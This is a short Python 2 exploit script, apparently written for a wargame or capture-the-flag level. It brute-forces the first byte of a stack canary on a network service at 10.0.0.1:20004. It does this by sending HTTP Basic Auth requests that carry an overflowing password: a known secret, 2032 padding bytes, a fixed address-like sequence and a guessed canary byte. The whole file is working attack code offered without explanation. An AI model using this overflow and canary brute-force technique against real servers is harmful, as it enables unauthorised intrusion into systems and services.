#!/usr/bin/env python
import socket
import base64
import time
import string
import random

# get the stack canary with the proper secret replaced

TCP_IP = '10.0.0.1'
TCP_PORT = 20004
BUFFER_SIZE = 1024

def create_http_request(uri, password):
	request = "GET "+uri+" HTTP/1.0\nAuthorization: Basic "+base64.b64encode(password)+"\n\n"
	return request

for c in xrange(0, 255):
	canary = chr(c)
	password = "PC1fysF7wbnh8vU0" + "A"*2032 + "\x00\xf5\xd4\x20" + canary
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((TCP_IP, TCP_PORT))
	httprequest = create_http_request("/./", password)
	s.send(httprequest)
	data = s.recv(BUFFER_SIZE)
	if "smashing" in data:
		print data
		continue
	else:
		print "First character: " + canary.encode("hex")
		break
	s.close()

